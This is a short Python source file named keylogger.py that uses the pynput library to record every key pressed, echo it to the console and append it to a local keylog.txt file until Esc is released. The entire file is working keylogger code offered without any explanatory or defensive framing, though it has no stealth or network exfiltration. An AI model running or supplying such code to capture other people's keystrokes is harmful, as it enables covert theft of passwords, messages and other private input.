# keylogger.py

from pynput import keyboard

def on_press(key):
    try:
        print(f'Key pressed: {key.char}')
        with open("keylog.txt", "a") as file:
            file.write(key.char)
    except AttributeError:
        print(f'Special key pressed: {key}')
        with open("keylog.txt", "a") as file:
            file.write(f'[{key}]')

def on_release(key):
    print(f'Key released: {key}')
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
